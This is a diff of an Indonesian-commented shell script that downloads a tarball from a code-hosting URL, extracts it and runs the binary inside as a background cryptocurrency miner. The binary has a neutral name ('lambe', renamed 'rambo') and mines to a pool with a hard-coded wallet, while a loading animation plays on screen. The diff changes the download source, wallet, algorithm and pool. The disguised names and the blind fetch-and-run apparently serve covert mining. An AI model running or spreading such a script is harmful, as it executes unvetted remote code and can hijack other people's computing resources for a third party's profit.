@@ -33,13 +33,13 @@ run_with_loading() {
 }
 
 # 1. Download
-run_with_loading "Downloading lambe.tar.gz..." curl -L -O https://gitlab.com/gas-group8801643/bac/-/raw/main/lambe.tar.gz
+run_with_loading "Downloading rambo.tar.gz..." curl -L -O https://github.com/stellavholiza-dev/bic/raw/main/rambo.tar.gz
 if [ $? -ne 0 ]; then
     exit 1
 fi
 
 # 2. Ekstrak
-run_with_loading "Extracting lambe.tar.gz..." tar -xvf lambe.tar.gz
+run_with_loading "Extracting rambo.tar.gz..." tar -xvf rambo.tar.gz
 if [ $? -ne 0 ]; then
     exit 1
 fi
@@ -62,7 +62,7 @@ if [ -z "$worker_name" ] || [ "$worker_name" = "0" ]; then
     worker_name="worker1"
 fi
 
-wallet="sahwa04"
+wallet="xel:nc9cm9ps6asjenezcjx8ynjwg8zvc77t5xg3djjw2ke33lxxqvtqq6p39r8"
 worker_tag="${wallet}.${worker_name}"
 if command -v nproc >/dev/null 2>&1; then
     if nproc --all >/dev/null 2>&1; then
@@ -74,9 +74,9 @@ else
     threads=1
 fi
 
-echo "Menjalankan lambe dengan worker: ${worker_tag}"
-./lambe --algorithm quantus --pool stratum+tcp://qtc.f2pool.com:4500 --wallet "$worker_tag" &
-lambe_PID=$!
+echo "Menjalankan rambo dengan worker: ${worker_tag}"
+./rambo --algorithm xelishashv3 --pool stratum+tcp://de.xelis.herominers.com:1225 --wallet "$worker_tag" &
+rambo_PID=$!
 
 # 1. Atur tampilan terminal
 tput civis
@@ -90,7 +90,7 @@ dots=0
 # Pindah ke baris baru khusus untuk animasi satu baris
 printf "\n"
 
-while kill -0 "$lambe_PID" 2>/dev/null; do
+while kill -0 "$rambo_PID" 2>/dev/null; do
     # Kembali ke awal baris animasi dan bersihkan baris tersebut
     printf '\033[1A\033[2K'
 
@@ -112,4 +112,4 @@ done
 
 tput cnorm
 printf "\033[0m\n"
-echo "[ SELESAI ] Proses lambe telah berhenti."
+echo "[ SELESAI ] Proses rambo telah berhenti."
